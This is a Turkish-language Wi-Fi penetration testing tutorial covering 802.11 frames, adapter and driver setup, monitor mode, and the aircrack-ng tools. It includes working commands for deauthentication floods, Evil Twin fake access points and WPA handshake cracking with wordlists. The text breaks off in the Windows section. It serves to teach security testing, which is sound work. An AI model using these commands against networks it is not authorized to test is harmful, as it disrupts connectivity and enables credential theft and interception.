# Kapsamlı Wi-Fi Sızma Testi Rehberi

Bu rehber, Wi-Fi ağlarının güvenliğini test etmek isteyen siber güvenlik meraklıları, öğrenciler ve profesyoneller için hazırlanmıştır. Teorik altyapıdan pratik saldırı senaryolarına kadar tüm süreci adım adım ele alarak, okuyucunun kendi laboratuvar ortamında yetkinlik kazanmasını amaçlamaktadır.

> **⚠️ Yasal Uyarı:** Bu belgede yer alan tüm bilgiler yalnızca **eğitim ve yasal test amaçlıdır**. Kendi izniniz olmayan veya yasal olarak test etme yetkinizin bulunmadığı ağlara karşı bu tekniklerin kullanılması yasa dışıdır ve ciddi sonuçlar doğurabilir. Yazar ve yayıncı, bu bilgilerin yasa dışı kullanımından sorumlu tutulamaz. **Kendi laboratuvar ortamınızda veya yazılı izniniz olan ağlarda pratik yapın.**

## İçindekiler

*   [Bölüm 1: Teorik Altyapı ve Laboratuvar Kurulumu](#bölüm-1-teorik-altyapı-ve-laboratuvar-kurulumu)
    *   [1.1. Temel Wi-Fi Kavramları](#11-temel-wi-fi-kavramları)
        *   [Wi-Fi İletişiminin Anatomisi: 802.11 Çerçeve (Frame) Türleri](#wi-fi-iletişiminin-anatomisi-80211-çerçeve-frame-türleri)
        *   [Wireshark Üzerinden Detaylı Analizler](#wireshark-üzerinden-detaylı-analizler)
        *   [Üç Çerçeve Tipinin Karşılaştırmalı Özeti](#üç-çerçeve-tipinin-karşılaştırmalı-özeti)
    *   [1.2. Laboratuvar Donanımı: Doğru Wireless Adaptörü Seçimi](#12-laboratuvar-donanımı-doğru-wireless-adaptörü-seçimi)
        *   [Satıcı (Vendor) ve Çipset Üreticisi Farkı](#satıcı-vendor-ve-çipset-üreticisi-farkı)
        *   [Çipset Uyumluluğunu Araştırma Yöntemleri](#çipset-uyumluluğunu-araştırma-yöntemleri)
        *   [Dikkat Edilmesi Gereken Diğer Faktörler](#dikkat-edilmesi-gereken-diğer-faktörler)
    *   [1.3. Laboratuvar Yazılımı ve Hazırlık (Kali Linux)](#13-laboratuvar-yazılımı-ve-hazırlık-kali-linux)
        *   [Gerekli Sürücülerin Kurulumu](#gerekli-sürücülerin-kurulumu)
        *   [Wireless Adaptörü Monitor Moda Alma](#wireless-adaptörü-monitor-moda-alma)
        *   [Monitor Moddaki Arayüzü Yapılandırma](#monitor-moddaki-arayüzü-yapılandırma)
*   [Bölüm 2: Aircrack-ng Araç Seti ve Pratik Kullanımı (Kali Linux)](#bölüm-2-aircrack-ng-araç-seti-ve-pratik-kullanımı-kali-linux)
    *   [2.1. Aircrack-ng Ailesine Genel Bakış](#21-aircrack-ng-ailesine-genel-bakış)
    *   [2.2. Temel Araçların Detaylı İncelenmesi](#22-temel-araçların-detaylı-incelenmesi)
        *   [airmon-ng (Hazırlayıcı)](#airmon-ng-hazırlayıcı)
        *   [airodump-ng (Gözcü)](#airodump-ng-gözcü)
        *   [aireplay-ng (Saldırgan)](#aireplay-ng-saldırgan)
        *   [airbase-ng (Taklitçi)](#airbase-ng-taklitçi)
        *   [aircrack-ng (Kırıcı)](#aircrack-ng-kırıcı)
*   [Bölüm 3: Windows Sistemlerde Wi-Fi Keşfi ve Analizi](#bölüm-3-windows-sistemlerde-wi-fi-keşfi-ve-analizi)
    *   [3.1. Windows Ortamının Sınırları ve Olanakları](#31-windows-ortamının-sınırları-ve-olanakları)
    *   [3.2. Yerel Komut Satırı ile Keşif (netsh)](#32-yerel-komut-satırı-ile-keşif-netsh)
        *   [Çevredeki Ağları Tarama (show network)](#çevredeki-ağları-tarama-show-network)
        *   [Sızma Sonrası Bilgi Toplama (Post-Exploitation)](#sızma-sonrası-bilgi-toplama-post-exploitation)
    *   [3.3. GUI Tabanlı Analiz Araçları](#33-gui-tabanlı-analiz-araçları)
        *   [Microsoft Network Monitor 3.4](#microsoft-network-monitor-34-arşivlenmiş-araç)
        *   [Diğer Pasif Analiz Araçları](#diğer-pasif-analiz-araçları)
*   [Bölüm 4: Uygulamalı Saldırı Senaryosu: WPA/WPA2 Handshake Yakalama ve Kırma](#bölüm-4-uygulamalı-saldırı-senaryosu-wpawpa2-handshake-yakalama-ve-kırma)
    *   [4.1. Senaryoya Genel Bakış ve Hedefler](#41-senaryoya-genel-bakış-ve-hedefler)
    *   [4.2. Adım 1: Hazırlık ve Keşif](#42-adım-1-hazırlık-ve-keşif)
    *   [4.3. Adım 2: Hedef Ağa Odaklanma ve Paket Yakalama](#43-adım-2-hedef-ağa-odaklanma-ve-paket-yakalama)
    *   [4.4. Adım 3: Handshake Yakalamayı Hızlandırma (Deauthentication Saldırısı)](#44-adım-3-handshake-yakalamayı-hızlandırma-deauthentication-saldırısı)
    *   [4.5. Adım 4: Handshake'i Kırma (Offline Saldırı)](#45-adım-4-handshakei-kırma-offline-saldırı)
    *   [4.6. Senaryo Özeti ve Sonuç](#46-senaryo-özeti-ve-sonuç)

---

## Bölüm 1: Teorik Altyapı ve Laboratuvar Kurulumu

Bu bölümde, Wi-Fi sızma testlerinin temelini oluşturan teorik bilgileri ve pratik testlerimizi yapacağımız laboratuvar ortamının nasıl kurulacağını detaylı bir şekilde inceleyeceğiz. Sağlam bir teorik altyapı, yapılan saldırıların "neden" işe yaradığını anlamamızı sağlar.

### 1.1. Temel Wi-Fi Kavramları

Wi-Fi, IEEE 802.11 standartları ailesi tarafından tanımlanan bir kablosuz ağ teknolojisidir. Sızma testlerinde başarılı olmak için bu standartların nasıl çalıştığını ve iletişimin en temel birimi olan **çerçeveleri (frames)** anlamak zorunludur.

#### Wi-Fi İletişiminin Anatomisi: 802.11 Çerçeve (Frame) Türleri

Ethernet (kablolu) ağlardaki gibi, Wi-Fi ağlarında da veri paketler halinde iletilir. Ancak kablosuz ortamın doğası gereği (paylaşılan ve güvenilir olmayan bir ortam), bu paketlerin yönetimi daha karmaşıktır. 802.11 standardı, iletişimi düzenlemek için üç ana çerçeve türü tanımlar:

1.  **Management Frames (Yönetim Çerçeveleri):** Wi-Fi ağının kurulmasını, sürdürülmesini ve sonlandırılmasını sağlayan çerçevelerdir. Cihazların ağları keşfetmesi, bağlanması ve ayrılması gibi temel işlevleri yönetirler. Bu çerçeveler **genellikle şifrelenmez**, bu da onları sızma testleri için birincil hedef haline getirir.
    *   **Beacon:** Access Point (AP) tarafından düzenli aralıklarla yayınlanan bir "ilan" çerçevesidir. Ağın varlığını, adını (SSID), desteklediği hızları, şifreleme türünü ve diğer temel bilgileri duyurur. `airodump-ng` gibi araçlar bu çerçeveleri dinleyerek çevredeki ağları listeler.
    *   **Probe Request:** Bir istemci (client) cihazın (örneğin, telefonunuzun) aktif olarak çevredeki Wi-Fi ağlarını sorgulamak için gönderdiği bir çerçevedir. Belirli bir SSID'yi veya tüm ağları sorgulayabilir ("broadcast probe").
    *   **Probe Response:** Bir AP'nin, aldığı bir Probe Request'e yanıt olarak gönderdiği çerçevedir. Beacon çerçevesine benzer bilgiler içerir ancak belirli bir istemciye yöneliktir.
    *   **Authentication:** Bir istemcinin bir AP'ye kimlik doğrulama isteği gönderdiği çerçevedir. WPA/WPA2'de bu, 4-yollu el sıkışma (4-way handshake) sürecinin başlangıcıdır.
    *   **Association Request/Response:** Kimlik doğrulandıktan sonra, istemcinin AP'ye tam olarak bağlanmak ve ağ kaynaklarına erişim izni istemek için gönderdiği/aldığı çerçevelerdir.
    *   **Deauthentication/Disassociation:** Bir istemciyi ağdan zorla düşürmek için kullanılan çerçevelerdir. Genellikle AP tarafından gönderilir, ancak bir saldırgan tarafından **taklit edilebilirler**. Bu, meşhur "deauth" saldırısının temelidir. Bu çerçeveler şifrelenmediği ve doğrulanmadığı için oldukça etkilidirler.

2.  **Control Frames (Kontrol Çerçeveleri):** Veri çerçevelerinin sorunsuz bir şekilde iletilmesini sağlamak için kullanılırlar. Veri akışını koordine ederler.
    *   **RTS (Request to Send):** Bir istemci, veri göndermeden önce iletişim kanalının (medyanın) meşgul olup olmadığını kontrol etmek ve kanalı belirli bir süre için rezerve etmek amacıyla bir RTS çerçevesi gönderebilir.
    *   **CTS (Clear to Send):** AP, RTS çerçevesini aldığında kanalı rezerve eder ve diğer tüm istemcilere "sessiz olmalarını" söyleyen bir CTS çerçevesi ile yanıt verir.
    *   **ACK (Acknowledgement):** Bir veri çerçevesini başarıyla alan cihaz, göndericiye her şeyin yolunda olduğunu bildirmek için bir ACK çerçevesi gönderir. Eğer gönderici belirli bir süre içinde ACK alamazsa, veri çerçevesini yeniden gönderir. Bu mekanizma, kablosuz ortamın güvenilir olmamasından kaynaklanan paket kayıplarını telafi eder.

3.  **Data Frames (Veri Çerçeveleri):** Kullanıcı verilerinin (web sayfaları, e-postalar, dosyalar vb.) fiilen taşındığı çerçevelerdir. Modern güvenlik protokolleri (WPA2/WPA3) kullanıldığında bu çerçevelerin **payload (yük) kısmı şifrelenir**. Bu nedenle, bir saldırgan bu çerçeveleri yakalasa bile, şifreyi bilmeden içeriğini okuyamaz.

#### Wireshark Üzerinden Detaylı Analizler

Wireshark, ağ trafiğini analiz etmek için en güçlü araçlardan biridir. Monitor moda alınmış bir wireless adaptör ile Wi-Fi çerçevelerini yakalayıp detaylıca inceleyebilirsiniz.

*   **Beacon Frame Analizi:** Wireshark'ta `wlan.fc.type_subtype == 0x08` filtresini kullanarak sadece Beacon çerçevelerini görebilirsiniz. Çerçevenin detaylarına indiğinizde "IEEE 802.11 Beacon frame" katmanı altında SSID, desteklenen hızlar, kanal bilgisi ve en önemlisi "Tagged Parameters" altında güvenlik bilgilerini (RSN/WPA) görebilirsiniz.
*   **Deauthentication Frame Analizi:** `wlan.fc.type_subtype == 0x0c` filtresi ile bu çerçeveleri yakalayabilirsiniz. Bu çerçevelerin ne kadar basit olduğunu, sadece gönderici (AP'nin MAC adresi), hedef (istemcinin MAC adresi) ve bir "sebep kodu" içerdiğini görebilirsiniz. Şifreleme veya doğrulama olmaması, neden bu kadar kolay taklit edilebildiklerini açıklar.

#### Üç Çerçeve Tipinin Karşılaştırmalı Özeti

| Özellik | Management Frames (Yönetim) | Control Frames (Kontrol) | Data Frames (Veri) |
| :--- | :--- | :--- | :--- |
| **Amaç** | Ağı kurma, yönetme, sonlandırma | Veri akışını düzenleme | Kullanıcı verisini taşıma |
| **Örnekler** | Beacon, Probe, Auth, Deauth | RTS, CTS, ACK | HTTP, FTP, DNS verileri |
| **Şifreleme**| **Genellikle Şifresiz** (PMF hariç) | **Şifresiz** | Payload (Yük) **Şifreli** (WPA2/3 ile) |
| **Pentest Önemi** | **ÇOK YÜKSEK** (Keşif, Deauth Saldırısı) | Orta (Trafik analizi) | Düşük (Şifreyi bilmeden anlamsız) |

### 1.2. Laboratuvar Donanımı: Doğru Wireless Adaptörü Seçimi

Wi-Fi sızma testleri için her wireless adaptör uygun değildir. Standart bir adaptör sadece bağlı olduğu ağın trafiğini görür. Bizim ise havadaki **tüm** trafiği yakalayabilen, yani **Monitor Mode** (İzleme Modu) ve **Packet Injection** (Paket Enjeksiyonu) yeteneklerine sahip bir adaptöre ihtiyacımız var.

#### Satıcı (Vendor) ve Çipset Üreticisi Farkı

Bir wireless adaptör satın alırken gördüğünüz marka (TP-Link, Alfa, Panda vb.) **satıcıdır (vendor)**. Adaptörün asıl beyni, yani Wi-Fi fonksiyonlarını yöneten entegre devre ise **çipsettir (chipset)**. Çipseti Ralink, Realtek, Atheros gibi firmalar üretir. Linux sürücü uyumluluğu ve sızma testi yetenekleri doğrudan çipsete bağlıdır.

> **Önemli Kural:** Markadan çok çipsete odaklanın. Aynı markanın farklı modelleri tamamen farklı çipsetler kullanabilir.

#### Çipset Uyumluluğunu Araştırma Yöntemleri

1.  **Uyumluluk Listelerini Kontrol Etme:**
    *   **Aircrack-ng Documentation:** Aircrack-ng'nin resmi sitesi, hangi çipsetlerin monitor mode ve packet injection için en iyi performansı verdiğini listeleyen harika bir "Best Wireless Adapters" bölümüne sahiptir. Bu, araştırmanıza başlamak için en iyi yerdir. Genellikle **Atheros AR9271** ve **Ralink RT3070** gibi eski çipsetler "tak-çalıştır" uyumluluğu ile bilinir. **Realtek RTL8812AU/RTL8814AU** gibi daha yeni çipsetler ise 5 GHz ve 802.11ac desteği sunar ancak sürücü kurulumu gerektirebilir.
    *   **Kernel.org & Linux Wireless Wiki:** Linux çekirdeğinin hangi sürücüleri desteklediğini gösteren resmi kaynaklardır. Daha teknik bir araştırma için idealdir.

2.  **FCC ID ile Çipset Tespiti (`fccid.io`):**
    Bir adaptörün çipsetinden emin değilseniz, cihazın arkasında bulunan **FCC ID** numarasını kullanabilirsiniz.
    *   `fccid.io` sitesine gidin.
    *   Adaptörün FCC ID'sini arama kutusuna yazın.
    *   Açılan sayfada "Internal Photos" (İç Fotoğraflar) bölümünü bulun.
    *   Bu fotoğraflarda, adaptörün devre kartı üzerindeki en büyük çipin üzerinde yazan model numarasını okuyarak çipseti tespit edebilirsiniz.

#### Dikkat Edilmesi Gereken Diğer Faktörler

*   **Frekans Desteği (2.4 GHz vs. 5 GHz):** Günümüzde çoğu ağ 5 GHz bandında çalışmaktadır. Sadece 2.4 GHz destekleyen bir adaptör, 5 GHz'deki ağları göremez. Kapsamlı bir test için **dual-band (çift bant)** desteği olan bir adaptör tercih etmek en iyisidir.
*   **Değiştirilebilir Antenler:** Harici ve değiştirilebilir antenler, daha güçlü (yüksek dBi'li) antenler takarak sinyal yakalama menzilinizi artırmanıza olanak tanır. Yönlü antenler kullanarak belirli bir hedeften gelen sinyallere odaklanabilirsiniz.

### 1.3. Laboratuvar Yazılımı ve Hazırlık (Kali Linux)

Kali Linux, yüzlerce sızma testi aracı önceden yüklenmiş olarak geldiği için bu iş için endüstri standardıdır. Kali'yi bir Sanal Makine (VirtualBox, VMware) veya doğrudan bir bilgisayara kurabilirsiniz. Sanal makine kullanıyorsanız, USB adaptörünüzü sanal makineye "bağlamanız" (attach) gerektiğini unutmayın.

#### Gerekli Sürücülerin Kurulumu

Bazı adaptörler Kali'de "tak-çalıştır" şeklinde çalışırken, özellikle yeni nesil (RTL88xxAU gibi) çipsetler için ek sürücü kurmak gerekebilir.

**Örnek: `realtek-rtl88xxau-dkms` Sürücüsünün Kali Linux'a Kurulumu**

Bu sürücü, popüler Alfa AWUS036ACH gibi adaptörler için gereklidir.

1.  **Sistemi Güncelleyin:**
    ```bash
    sudo apt update
    sudo apt full-upgrade -y
    ```
2.  **Gerekli Başlık (Header) Dosyalarını Kurun:**
    Sürücünün, çalışmakta olan çekirdeğe (kernel) göre derlenmesi gerekir.
    ```bash
    sudo apt install -y linux-headers-$(uname -r)
    ```
3.  **DKMS ve Git Kurun:**
    DKMS (Dynamic Kernel Module Support), çekirdek güncellendiğinde sürücünün otomatik olarak yeniden derlenmesini sağlar.
    ```bash
    sudo apt install -y dkms git
    ```
4.  **Sürücü Kaynak Kodunu İndirin ve Kurun:**
    ```bash
    # Aircrack-ng ekibi tarafından yönetilen, test edilmiş ve güvenilir repoyu kullanıyoruz.
    git clone https://github.com/aircrack-ng/rtl8812au.git
    cd rtl8812au/
    sudo make dkms_install
    ```
5.  **Sistemi Yeniden Başlatın:**
    Değişikliklerin etkili olması için sistemi yeniden başlatmak en güvenli yoldur.
    ```bash
    sudo reboot
    ```

#### Wireless Adaptörü Monitor Moda Alma

Bu, adaptörün normal çalışma modundan çıkıp, belirli bir ağa bağlı olmadan havadaki tüm 802.11 çerçevelerini pasif olarak dinlemesini sağlayan moddur.

**Yöntem 1: `airmon-ng` ile Otomatik Yapılandırma (Tavsiye Edilen)**

`airmon-ng`, Aircrack-ng süitinin bir parçasıdır ve bu süreci basitleştirir. Arka planda çakışmalara neden olabilecek servisleri otomatik olarak durdurur.

1.  **Adaptör Arayüzünü Bulma:**
    ```bash
    iwconfig
    # Çıktıda 'wlan0', 'wlan1' gibi bir arayüz görmelisiniz.
    ```
2.  **Çakışan Servisleri Kontrol Etme ve Durdurma:**
    ```bash
    sudo airmon-ng check kill
    ```
3.  **Monitor Modu Başlatma:**
    ```bash
    # 'wlan0' yerine kendi arayüz adınızı yazın.
    sudo airmon-ng start wlan0
    ```
    Bu komut, `wlan0mon` (veya Kali'nin yeni sürümlerinde `wlan0`) adında yeni bir monitor mod arayüzü oluşturacaktır. `iwconfig` ile yeni arayüzün modunun "Monitor" olduğunu doğrulayın.

**Yöntem 2: Manuel Yapılandırma (`iw` ve `iwconfig` ile)**

Bu yöntem daha fazla kontrol sağlar ancak çakışan servisleri sizin yönetmenizi gerektirir.

1.  **Arayüzü Kapatma:**
    ```bash
    sudo ip link set wlan0 down
    ```
2.  **Modu "Monitor" Olarak Değiştirme:**
    ```bash
    # Modern 'iw' aracı ile
    sudo iw dev wlan0 set type monitor
    # veya eski 'iwconfig' aracı ile
    # sudo iwconfig wlan0 mode monitor
    ```
3.  **Arayüzü Açma:**
    ```bash
    sudo ip link set wlan0 up
    ```
4.  **Doğrulama:**
    ```bash
    iwconfig wlan0
    # Çıktıda "Mode:Monitor" ifadesini görmelisiniz.
    ```

**Yöntemlerin Karşılaştırma Tablosu**

| Özellik | `airmon-ng` | Manuel (`iw`/`iwconfig`) |
| :--- | :--- | :--- |
| **Kullanım Kolaylığı** | Kolay | Orta |
| **Otomasyon** | Çakışan işlemleri otomatik durdurur | Manuel işlem gerektirir |
| **Kontrol** | Daha az esnek | Tam kontrol sağlar |
| **Önerilen Durum** | Yeni başlayanlar ve hızlı kurulumlar | Scripting ve ileri seviye kullanıcılar |

#### Monitor Moddaki Arayüzü Yapılandırma

Monitor moddaki adaptör, varsayılan olarak tüm kanallar arasında sürekli geçiş yapar (**channel hopping**). Belirli bir hedef ağa odaklanmak için adaptörü o ağın çalıştığı kanala sabitlememiz gerekir.

1.  **Desteklenen Kanalları Listeleme (`iwlist`):**
    Adaptörünüzün hangi kanalları ve frekansları desteklediğini görmek için:
    ```bash
    iwlist wlan0mon channel
    ```
2.  **Kanalı Manuel Olarak Değiştirme:**
    Hedef AP'nin 6. kanalda çalıştığını varsayalım.
    ```bash
    # Modern 'iw' aracı ile (Tavsiye edilen)
    sudo iw dev wlan0mon set channel 6

    # Eski 'iwconfig' aracı ile
    sudo iwconfig wlan0mon channel 6
    ```
3.  **Kanal Sabitlemenin Pentester İçin Önemi:**
    Bir WPA/WPA2 handshake'i yakalamaya çalışırken, istemci ve AP arasındaki o kısa süreli paket alışverişini kaçırmamamız gerekir. Eğer adaptörümüz sürekli kanal değiştiriyorsa, tam da handshake gerçekleştiği anda başka bir kanalda olabilir ve bu kritik paketleri yakalayamayabiliriz. `airodump-ng` gibi araçlar kanal sabitleme işlemini `--channel` parametresi ile otomatik olarak yapar, ancak sürecin arkasında ne olduğunu bilmek önemlidir.

---

## Bölüm 2: Aircrack-ng Araç Seti ve Pratik Kullanımı (Kali Linux)

Aircrack-ng, Wi-Fi sızma testleri için İsviçre çakısı gibidir. Sadece bir araç değil, farklı görevler için özelleşmiş bir araçlar koleksiyonudur. Bu bölümde, bu ailenin en önemli üyelerini ve rollerini detaylıca inceleyeceğiz.

### 2.1. Aircrack-ng Ailesine Genel Bakış

Aircrack-ng süiti, bir Wi-Fi saldırısının tüm aşamalarını kapsayan araçlar sunar: keşif, trafik yakalama, saldırı ve şifre kırma. Araçları rollerine göre sınıflandırabiliriz:

*   **Hazırlayıcı (`airmon-ng`):** Savaş alanını (wireless adaptörü) hazırlar, onu dinleme moduna geçirir.
*   **Gözcü (`airodump-ng`):** Savaş alanını gözlemler, düşman birliklerini (AP'ler ve istemciler) tespit eder ve hareketlerini kaydeder.
*   **Saldırgan (`aireplay-ng`):** Düşmana aktif olarak müdahale eder. Sahte paketler gönderir, bağlantıları koparır (deauth), trafiği yeniden enjekte eder.
*   **Taklitçi (`airbase-ng`):** Düşmanı kandırmak için sahte üsler (sahte AP'ler) kurar. Evil Twin saldırılarının temelini oluşturur.
*   **Kırıcı (`aircrack-ng`):** Gözcünün ele geçirdiği şifreli mesajları (handshake) analiz eder ve kaba kuvvet/sözlük saldırıları ile şifreyi çözmeye çalışır.

### 2.2. Temel Araçların Detaylı İncelenmesi

Şimdi bu araçları komutları ve parametreleriyle birlikte daha yakından tanıyalım.

#### `airmon-ng` (Hazırlayıcı)

*   **Görevi:** Wireless adaptörleri yönetmek, özellikle de monitor moda almak ve bu moddan çıkarmak.
*   **Temel Komutları:**
    *   `sudo airmon-ng`: Sistemdeki potansiyel wireless arayüzlerini listeler.
    *   `sudo airmon-ng check kill`: Monitor mod ile çakışabilecek (NetworkManager gibi) servisleri kontrol eder ve sonlandırır. Saldırıya başlamadan önce çalıştırmak şiddetle tavsiye edilir.
    *   `sudo airmon-ng start <arayüz>`: Belirtilen arayüzü (örn: `wlan0`) monitor moda alır ve genellikle `<arayüz>mon` (örn: `wlan0mon`) adında yeni bir sanal arayüz oluşturur.
    *   `sudo airmon-ng stop <monitor_arayüz>`: Monitor modu durdurur ve arayüzü tekrar yönetilen (managed) moda döndürür. Çakışan servisleri yeniden başlatmaya çalışır.

*   **Örnek Kullanım:**
    ```bash
    # 1. Çakışmaları gider
    sudo airmon-ng check kill

    # 2. wlan0 arayüzünü monitor moda al
    sudo airmon-ng start wlan0

    # ... Saldırı işlemleri yapılır ...

    # 3. Monitor modu durdur
    sudo airmon-ng stop wlan0mon
    ```

#### `airodump-ng` (Gözcü)

*   **Görevi:** Çevredeki 802.11 ağlarını ve bu ağlara bağlı istemcileri tespit etmek. Detaylı bilgi toplar ve yakalanan trafiği bir dosyaya kaydedebilir.
*   **Parametreleri ve Filtreleri:**
    *   `<monitor_arayüz>`: Paket yakalamak için kullanılacak monitor moddaki arayüz (örn: `wlan0mon`).
    *   `--band <abg>`: Sadece belirtilen bantlarda tarama yapar (`a`=5GHz, `b/g`=2.4GHz). Örneğin `--band ag` ile her iki bandı da tarar.
    *   `--bssid <MAC_adresi>`: Sadece belirtilen BSSID'ye (AP'nin MAC adresi) sahip ağa odaklanır.
    *   `--channel <kanal>`: Sadece belirtilen kanalda dinleme yapar (kanal atlamayı durdurur).
    *   `-w <dosya_adı>` veya `--write <dosya_adı>`: Yakalanan tüm paketleri belirtilen dosyaya kaydeder. `airodump-ng` bu dosyaya çeşitli uzantılar ekler (`.cap`, `.csv`, `.kismet.netxml`). Şifre kırma için bize `.cap` dosyası lazımdır.
    *   `--essid <ağ_adı>`: Sadece belirtilen ağ adına (SSID) sahip ağlara odaklanır.

*   **Çıktı Analizi:**
    `airodump-ng` çalışırken iki tablo gösterir:
    1.  **Üst Tablo (AP'ler):**
        *   `BSSID`: Access Point'in MAC adresi.
        *   `PWR`: Sinyal gücü. Sayı ne kadar küçükse (örn: -40), sinyal o kadar güçlüdür.
        *   `Beacons`: Yakalanan beacon çerçevelerinin sayısı.
        *   `#Data`: Yakalanan veri paketlerinin sayısı.
        *   `CH`: AP'nin çalıştığı kanal.
        *   `ENC`, `CIPHER`, `AUTH`: Şifreleme (WEP, WPA, WPA2), şifreleme algoritması (CCMP, TKIP) ve kimlik doğrulama yöntemi (PSK, MGT).
        *   `ESSID`: Ağın adı.
    2.  **Alt Tablo (İstemciler):**
        *   `BSSID`: İstemcinin bağlı olduğu AP'nin MAC adresi.
        *   `STATION`: İstemcinin MAC adresi.
        *   `PWR`: İstemciden gelen sinyalin gücü.
        *   `Rate`, `Lost`, `Frames`: İletişimle ilgili istatistikler.

*   **Örnek Kullanım:**
    ```bash
    # Genel keşif: 2.4GHz ve 5GHz bandındaki tüm ağları tara
    sudo airodump-ng wlan0mon

    # Hedefli keşif: 6. kanaldaki belirli bir AP'ye (BSSID) odaklan ve trafiği "hedef_ag" dosyasına yaz
    sudo airodump-ng --bssid 11:22:33:AA:BB:CC --channel 6 -w hedef_ag wlan0mon
    ```

#### `aireplay-ng` (Saldırgan)

*   **Görevi:** Çeşitli kablosuz saldırıları gerçekleştirmek için özel olarak hazırlanmış paketler enjekte etmek.
*   **Saldırı Modları:**
    *   `-0 <sayı>` veya `--deauth <sayı>`: **Deauthentication Saldırısı**. Belirtilen sayıda deauth paketi göndererek bir veya daha fazla istemciyi ağdan düşürür. `0` sonsuz sayıda paket gönderir.
    *   `-1 <zaman>` veya `--fakeauth <zaman>`: Sahte kimlik doğrulama (WEP için).
    *   `-3` veya `--arpreplay`: ARP request replay saldırısı (WEP için).
    *   *Diğer modlar genellikle eski WEP saldırıları için kullanılır ve modern ağlarda pek relevant değildir.*

*   **Filtreleri ve Hata Yönetimi:**
    *   `-a <ap_bssid>`: Hedef Access Point'in BSSID'si.
    *   `-c <client_mac>`: Hedef istemcinin MAC adresi. Bu parametre belirtilmezse, deauth paketi broadcast olarak gönderilir ve AP'ye bağlı **tüm** istemciler hedeflenir.
    *   `--ignore-negative-one`: Bazen `aireplay-ng` "fixed channel -1" hatası verebilir. Bu, adaptörün kanalının düzgün ayarlanmadığı anlamına gelir. Bu bayrak bazen sorunu çözse de, en iyi çözüm `iw` veya `iwconfig` ile kanalı manuel olarak sabitlemektir.

*   **Örnek Kullanım:**
    ```bash
    # Bir istemciyi (55:44:33:CC:BB:AA) bağlı olduğu AP'den (11:22:33:AA:BB:CC) 5 kez düşür.
    sudo aireplay-ng --deauth 5 -a 11:22:33:AA:BB:CC -c 55:44:33:CC:BB:AA wlan0mon

    # AP'ye (11:22:33:AA:BB:CC) bağlı TÜM istemcilere sürekli deauth paketi gönder.
    sudo aireplay-ng -0 0 -a 11:22:33:AA:BB:CC wlan0mon
    ```

#### `airbase-ng` (Taklitçi)

*   **Görevi:** Yazılım tabanlı bir Access Point oluşturmak. Genellikle Evil Twin, Karma, veya Man-in-the-Middle (MITM) saldırıları için kullanılır.
*   **Parametreleri ve Evil Twin Senaryoları:**
    *   `--essid <ağ_adı>` veya `-e <ağ_adı>`: Oluşturulacak sahte AP'nin adı.
    *   `--channel <kanal>` veya `-c <kanal>`: Sahte AP'nin çalışacağı kanal.
    *   `-P`: İstemcilerden gelen probe request'lere yanıt vermeyi sağlar (Karma saldırısı).
    *   `wlan0mon`: kullanılacak arayüz.

*   **Evil Twin Senaryosu:**
    1.  Meşru bir AP ("Ofis_WiFi", kanal 6) tespit edilir.
    2.  `airbase-ng` kullanılarak aynı isim ve kanalda sahte bir AP ("Ofis_WiFi", kanal 6) oluşturulur. Sinyal gücünüz hedeften daha yüksekse, istemciler otomatik olarak size bağlanabilir.
    3.  `aireplay-ng` ile meşru AP'ye bağlı istemcilere deauth saldırısı yapılarak onların bağlantısı koparılır.
    4.  Cihazlar yeniden bağlanmaya çalışırken, sizin daha güçlü sinyal yayan sahte AP'nize bağlanırlar.
    5.  Bu noktada, tüm trafikleri sizin üzerinizden geçtiği için bir MITM saldırısı gerçekleştirebilirsiniz.

*   **Örnek Kullanım:**
    ```bash
    # "Ucretsiz_Internet" adında, 1. kanalda çalışan bir sahte AP oluştur.
    sudo airbase-ng -e "Ucretsiz_Internet" -c 1 wlan0mon
    ```

#### `aircrack-ng` (Kırıcı)

*   **Görevi:** `airodump-ng` ile yakalanan `.cap` dosyasını analiz ederek WEP veya WPA/WPA2 anahtarlarını kırmak.
*   **Temel Parametreleri:**
    *   `<pcap_dosyası>`: Yakalanan trafiği içeren `.cap` veya `.pcap` uzantılı dosya.
    *   `-w <sözlük_dosyası>`: **WPA/WPA2 PSK Kırma:** Şifre denemeleri için kullanılacak kelime listesi (wordlist).
    *   `-b <bssid>`: Dosya içinde birden fazla handshake varsa, sadece belirtilen BSSID'ye ait olanı kırmayı hedefler.
    *   `-e <essid>`: Sadece belirtilen ESSID'ye ait ağı kırmayı hedefler.

*   **WPA/WPA2 Kırma Süreci:**
    `aircrack-ng`, WPA/WPA2 şifresini **doğrudan kırmaz**. Bunun yerine, yakalanan 4-yollu el sıkışmayı (handshake) kullanır. Sözlükteki her bir kelimeyi potansiyel şifre olarak dener, bu şifre ile bir anahtar (PMK) türetir ve bu anahtarın handshake'i doğrulamak için kullanılıp kullanılamayacağını kontrol eder. Eşleşme bulunursa, doğru şifre bulunmuş demektir.

> **Önemli:** Saldırının başarısı, tamamen kullandığınız **sözlüğün kalitesine** bağlıdır. Eğer gerçek şifre sözlüğünüzde yoksa, `aircrack-ng` şifreyi **asla** bulamaz.

*   **Örnek Kullanım:**
    ```bash
    # "hedef_ag-01.cap" dosyasındaki handshake'i "rockyou.txt" sözlüğünü kullanarak kır.
    aircrack-ng -w /usr/share/wordlists/rockyou.txt hedef_ag-01.cap

    # Aynı dosyada, sadece belirli bir AP'yi hedef alarak kır.
    aircrack-ng -w /path/to/my/wordlist.txt -b 11:22:33:AA:BB:CC hedef_ag-01.cap
    ```

---

## Bölüm 3: Windows Sistemlerde Wi-Fi Keşfi ve Analizi

Bu bölümde, Windows işletim sisteminin Wi-Fi analizi konusundaki yeteneklerini ve sınırlarını inceleyeceğiz. Genellikle sızma testleri için Kali Linux tercih edilse de, Windows'un kendi araçlarıyla da değerli bilgiler elde edilebilir.

### 3.1. Windows Ortamının Sınırları ve Olanakları

Windows'ta Wi-Fi sızma testi yapmanın önündeki en büyük engel, işletim sistemi ve sürücü mimarisidir.

*   **Monitor Mode Kısıtlaması:** Windows, varsayılan olarak wireless adaptörlerin **native monitor mode**'a geçmesine izin vermez. Standart sürücüler (NDIS), adaptörün sadece bağlı olduğu AP ile iletişim kurmasını sağlar, havadaki tüm trafiği dinlemesine izin vermez. Bu, `airodump-ng` gibi araçların Windows'ta doğrudan çalışmasını engeller.
*   **Packet Injection Kısıtlaması:** Benzer şekilde, Windows ham 802.11 paketlerinin (deauth çerçeveleri gibi) doğrudan enjekte edilmesine de izin vermez. Bu da `aireplay-ng` gibi aktif saldırı araçlarını işlevsiz kılar.

